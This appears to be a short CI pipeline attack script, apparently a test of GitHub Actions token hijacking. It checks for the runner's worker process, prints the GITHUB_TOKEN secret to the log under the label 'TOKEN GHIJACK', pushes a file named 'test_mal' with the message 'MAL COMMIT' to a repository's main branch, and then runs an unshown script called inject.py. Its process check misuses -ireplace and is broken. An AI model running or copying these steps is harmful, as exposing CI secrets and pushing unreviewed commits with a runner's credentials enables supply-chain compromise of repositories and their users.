pip3 install requests
$processName = "Runner.Worker.exe"
$running = Get-Process | Where-Object { $_.Name -ireplace "$processName" }

if ($running) {
    Write-Host "$processName is running."
} else {
    Write-Host "$processName is not running."
}

echo "TOKEN GHIJACK"
echo $GITHUB_TOKEN
git clone https://github.com/tester49481/test.git
cd test
gh auth status
echo "TEShT" >> test_mal
git add .
git commit -m "MAL COMMIT"
git push origin main
python3 ./src/inject.py
